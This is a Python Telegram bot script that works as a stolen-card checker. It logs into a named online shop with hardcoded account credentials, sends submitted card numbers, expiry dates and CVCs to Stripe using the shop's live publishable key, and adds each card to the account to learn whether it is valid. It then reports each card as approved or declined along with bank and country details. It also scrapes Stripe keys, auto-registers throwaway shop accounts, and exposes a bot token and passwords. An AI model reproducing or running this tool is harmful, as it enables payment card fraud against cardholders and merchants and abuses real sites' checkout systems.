import telebot
import time
import requests, re
import random
import string
import uuid
from fake_useragent import UserAgent
from bs4 import BeautifulSoup

TOKEN = "8405999399:AAHx1JVybaJeamnSe2NJoJDbfd0iJR1BQLI"
bot = telebot.TeleBot(TOKEN)

PAYMENT_LIMIT = 50
payment_count = 0 
session = None

def extract_pk_key(text):
    patterns = [
        r'"key"\s*:\s*"(pk_live_[A-Za-z0-9]+)"',
        r'"publishableKey"\s*:\s*"(pk_live_[0-9a-zA-Z]{24,})"',
        r'"stripePublishableKey"\s*:\s*"(pk_live_[0-9a-zA-Z]+)"',
        r'"(?:key|pk|publishable_key|public_key)"\s*:\s*"(pk_live_[A-Za-z0-9_]+)"',
        r"'(pk_live_[A-Za-z0-9]+)'",
        r'(pk_live_[A-Za-z0-9]{24,})'
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(1)
    return None 

def get_payment_count():
    global payment_count
    return payment_count

def increment_payment_count():
    global payment_count
    payment_count += 1

def reset_payment_count():
    global payment_count
    payment_count = 0

def reset_session():
    global session
    session = None

def create_new_account(domain):
    global session
    session = requests.Session()
    user_agent = UserAgent().random
    mail = f"syrune{random.randint(10000, 99999)}@gmail.com"
    user = f"Syrune{random.choice(string.ascii_lowercase)}"
    
    headers = {
        'authority': 'bella-jewelry.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://bella-jewelry.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        # First get the registration page
        reg_page = session.get(f'https://{domain}/my-account/', headers=headers, timeout=15)
        print(reg_page.text)
        reg_page.raise_for_status()
        
        soup = BeautifulSoup(reg_page.text, "html.parser")
        nonce_input = soup.find("input", {"name": "woocommerce-register-nonce"})

        if not nonce_input:
            print("No nonce found in registration page")
            return False

        nonce = nonce_input.get("value")
        wp_referer = soup.find("input", {"name": "_wp_http_referer"})
        referer_value = wp_referer.get("value") if wp_referer else "/my-account/"

        data = {
            'username': user,
            'email': mail,
            'password': 'JUABIEGEO728VSS',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': referer_value,
            'register': 'Register',
        }
        
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'https://{domain}',
            'Referer': f'https://{domain}/my-account/',
        })
        
        response = session.post(f'https://{domain}/my-account/', headers=headers, data=data, timeout=15)
        
        # Check if registration was successful by looking for logout link
        if 'Logout' in response.text or 'Log out' in response.text:
            print(f"Account created successfully: {user}")
            return True
        else:
            print("Registration might have failed")
            return response.status_code == 200
            
    except Exception as e:
        print(f"Error in account creation: {str(e)}")
        return False

def fetch_bin_details(card):
    bin_prefix = card[:6]
    try:
        binlist_url = f"https://lookup.binlist.net/{bin_prefix}"
        headers = {"Accept-Version": "3"}
        bl_res = requests.get(binlist_url, headers=headers, timeout=5)

        if bl_res.status_code == 200:
            bl = bl_res.json()
            return {
                "brand": bl.get("scheme", "Unknown"),
                "type": bl.get("type", "Unknown"),
                "country": bl.get("country", {}).get("name", "Unknown"),
                "bank": bl.get("bank", {}).get("name", "Unknown"),
            }
    except:
        pass

    return {
        "brand": "Unknown",
        "type": "Unknown",
        "country": "Unknown",
        "bank": "Unknown",
    }

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "👋 Hello! use /cmds")

@bot.message_handler(commands=['cmds'])
def show_commands(message):
    commands_list = """
Available Commands:
/vi <card> -» Kasper Stripe Auth
"""
    bot.reply_to(message, commands_list)

@bot.message_handler(commands=['vi'])
def process_card(message):
    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) < 2:
            bot.reply_to(message, "Format: /vi <card_details>")
            return
        
        card = cmd_parts[1]

        if "|" not in card or len(card.split("|")) != 4:
            bot.reply_to(message, "Invalid card format. Use: number|mm|yy|cvc")
            return

        processing_msg = bot.reply_to(message, "Processing...")
        processing_msg_id = processing_msg.message_id
 
        start_time = time.time()
        
        bin_info = fetch_bin_details(card)
        response = Tele(card)
        
        end_time = time.time()
        time_taken = round(end_time - start_time, 2)
        
        bot.delete_message(chat_id=message.chat.id, message_id=processing_msg_id)
        
        # Handle both string and dictionary responses
        if isinstance(response, dict):
            if response.get('success'):
                response_text = f"""
Card -» {card}
Status -» Approved! ✅
Message -» {response.get('message', 'Card Added.')}
Gateway -» stripe kasper
Country -» {bin_info.get('country', '')}
Bank -» {bin_info.get('bank', '')}
Time -» {time_taken}s
"""
            else:
                error_msg = response.get('error', 'Your card was declined.')
                
                # Parse Stripe error message if available
                if response.get('data') and isinstance(response['data'], dict):
                    error_data = response['data'].get('error', {})
                    if isinstance(error_data, dict):
                        error_msg = error_data.get('message', error_msg)
                    elif isinstance(error_data, str):
                        error_msg = error_data
                
                response_text = f"""
Card -» {card}
Status -» Declined! ❌
Message -» {error_msg}
Gateway -» stripe kasper
Country -» {bin_info.get('country', '')}
Bank -» {bin_info.get('bank', '')}
Time -» {time_taken}s
"""
        elif isinstance(response, str):
            # Handle string responses from Tele function
            if "success" in response.lower():
                response_text = f"""
Card -» {card}
Status -» Approved! ✅
Message -» Card Added Successfully
Gateway -» stripe kasper
Country -» {bin_info.get('country', '')}
Bank -» {bin_info.get('bank', '')}
Time -» {time_taken}s
"""
            else:
                response_text = f"""
Card -» {card}
Status -» Declined! ❌
Message -» {response}
Gateway -» stripe kasper
Country -» {bin_info.get('country', '')}
Bank -» {bin_info.get('bank', '')}
Time -» {time_taken}s
"""
        else:
            response_text = f"""
Card -» {card}
Status -» Error! ❌
Message -» Unexpected response format: {type(response)}
Gateway -» stripe kasper
Country -» {bin_info.get('country', '')}
Bank -» {bin_info.get('bank', '')}
Time -» {time_taken}s
"""
        
        bot.reply_to(message, response_text)
        
    except Exception as e:
        if 'processing_msg_id' in locals():
            try:
                bot.delete_message(chat_id=message.chat.id, message_id=processing_msg_id)
            except:
                pass
        
        bot.reply_to(message, f"Error processing card: {str(e)}")

def Tele(ccx):
    try:
        ccx = ccx.strip()
        cc, mm, yy, cvv = ccx.split("|")

        if "20" in yy:
            yy = yy.split("20")[1]

        user_agent = UserAgent().random
        r = requests.Session()
       
        user = "syrunex" + str(random.randint(1000, 9999))
        mail = user + "@gmail.com"
        
        headers = {
            'authority': 'shop.manner.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': 'https://shop.manner.com/man_int/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get(
            'https://shop.manner.com/man_int/customer/account/login/referer/aHR0cHM6Ly9zaG9wLm1hbm5lci5jb20vbWFuX2ludC9jdXN0b21lci9hY2NvdW50L2luZGV4Lw~~/',
            headers=headers,
        )
        
        html = response.text
        
        # Parse HTML with BeautifulSoup
        soup = BeautifulSoup(html, 'html.parser')
        form_key_input = soup.find('input', {'name': 'form_key'})
        
        if form_key_input:
            key = form_key_input.get('value')
            print(f"Form key: {key}")
        else:
            return {'error': 'Could not extract form key'}
        
        headers = {
            'authority': 'shop.manner.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://shop.manner.com',
            'referer': 'https://shop.manner.com/man_int/customer/account/login/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }
        
        data = {
            'form_key': key,
            'login[username]': 'igcc4280@gmail.com',
            'login[password]': 'C@qOH0of2Jb$jbi',
            'persistent_remember_me': 'on',
        }
        
        response = r.post(
            'https://shop.manner.com/man_int/customer/account/loginPost/',
            headers=headers,
            data=data,
            allow_redirects=False  # Don't follow redirects to check login
        )
        #print(f"Login response: {response.status_code}")
        
        # Check if login was successful (should redirect after POST)
        if response.status_code != 302:
            return {'error': 'Login failed - invalid credentials or site issue'}
        
        headers = {
            'authority': 'shop.manner.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://shop.manner.com/man_int/customer/account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }
        
        response = r.get('https://shop.manner.com/man_int/stripe/customer/paymentmethods/', headers=headers)
        #print(f"Payment methods page: {response.status_code}")
        
        # Check if we're actually logged in
        if 'customer/account/login' in response.url:
            return {'error': 'Session expired, please try again'}
        
        guid, muid, sid, csi = [str(uuid.uuid4()) for _ in range(4)]
     
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }
        
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IQ&pasted_fields=number&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fshop.manner.com&time_on_page=411369&client_attribution_metadata[client_session_id]={csi}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=a65a5207-ef44-49f3-8a63-0f316e664c69&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51IAvn9FuKmfQdziff1ZttUVotdtFS65Bh6lfVfWRCL8K0GXOCvOosDt45XyI2c03kiZpPNUrAvxGLyIUp6BmJqSh00ExuNocOq&_stripe_version=2025-08-27.basil'
        
        stripe_response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        j = stripe_response.json()
        
        if "id" not in j:
            error_msg = j.get('error', {}).get('message', 'Unknown Stripe error')
            return {'error': f"Stripe: {error_msg}"}
        
        pid = j["id"]
        print(f"Payment method ID: {pid}")
        
        headers = {
            'authority': 'shop.manner.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://shop.manner.com',
            'referer': 'https://shop.manner.com/man_int/stripe/customer/paymentmethods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        json_data = {
            'paymentMethodId': pid,
        }
        
        # Use the same session object 'r' to maintain cookies
        response = r.post(
            'https://shop.manner.com/man_int/rest/V1/stripe/payments/add_payment_method',
            headers=headers,
            json=json_data,
        )
        
        #print(f"Add payment method response: {response.status_code}")
        #print(f"Response text: {response.text}")
        
        try:
            response_data = response.json()
            response_text = str(response_data)
            
            if ('pm_' in response_text and 
                '"brand"' in response_text and 
                '"exp_month"' in response_text):
                return {'success': True, 'message': 'Card Added Successfully'}
            else:
                return {'error': 'Card was declined by the payment gateway'}
        except Exception as e:
            return {'error': f'Failed to parse response: {str(e)}'}
            
    except Exception as e:
        return {'error': f'Processing error: {str(e)}'}
            
print("Bot starting...")
try:
    bot.infinity_polling()
    print("Bot is running!")
except Exception as e:
    print(f"Bot failed to start: {e}")
